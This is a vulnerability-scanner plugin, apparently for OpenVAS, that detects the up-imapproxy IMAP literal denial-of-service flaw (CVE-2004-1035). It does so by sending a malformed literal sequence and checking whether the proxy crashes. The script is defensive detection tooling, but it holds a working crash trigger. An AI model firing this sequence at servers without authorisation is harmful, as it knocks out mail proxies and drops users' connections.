if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15853" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:P" );
	script_cve_id( "CVE-2004-1035" );
	script_bugtraq_id( 11630 );
	script_xref( name: "OSVDB", value: "11584" );
	script_name( "up-imapproxy Literal DoS Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Denial of Service" );
	script_dependencies( "imap4_banner.sc" );
	script_require_ports( "Services/imap", 143 );
	script_mandatory_keys( "imap/banner/available" );
	script_tag( name: "solution", value: "Upgrade to up-imapproxy 1.2.3rc2 or later." );
	script_tag( name: "summary", value: "The remote host is running at least one instance of up-imapproxy that does
  not properly handle IMAP literals." );
	script_tag( name: "impact", value: "This flaw allows a remote attacker to crash the proxy, killing existing
  connections as well as preventing new ones, by using literals at unexpected times." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("imap_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = imap_get_port( default: 143 );
encaps = get_port_transport( port );
if(encaps > ENCAPS_IP){
	exit( 0 );
}
banner = imap_get_banner( port: port );
if(!banner){
	exit( 0 );
}
tag = 0;
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = recv_line( socket: soc, length: 1024 );
s = chomp( s );
if(!s){
	close( soc );
	exit( 0 );
}
vtstrings = get_vt_strings();
++tag;
c = NASLString( "a", NASLString( tag ), " ", vtstrings["lowercase"], " is testing {1}" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
	resp = "";
}
if(resp && IsMatchRegexp( resp, "BAD" )){
	c = "up-imapproxy";
	send( socket: soc, data: NASLString( c, "\\r\\n" ) );
	for(;s = recv_line( socket: soc, length: 1024 );){
		s = chomp( s );
		m = eregmatch( pattern: "^[^ ]+ (OK|BAD|NO)", string: s, icase: TRUE );
		if(!isnull( m )){
			resp = m[1];
			break;
		}
		resp = "";
	}
	if(!resp){
		close( soc );
		soc = open_sock_tcp( port );
		if(!soc){
			security_message( port: port );
			exit( 0 );
		}
	}
}
++tag;
c = NASLString( "a", NASLString( tag ), " LOGOUT" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
	resp = "";
}
close( soc );
exit( 99 );

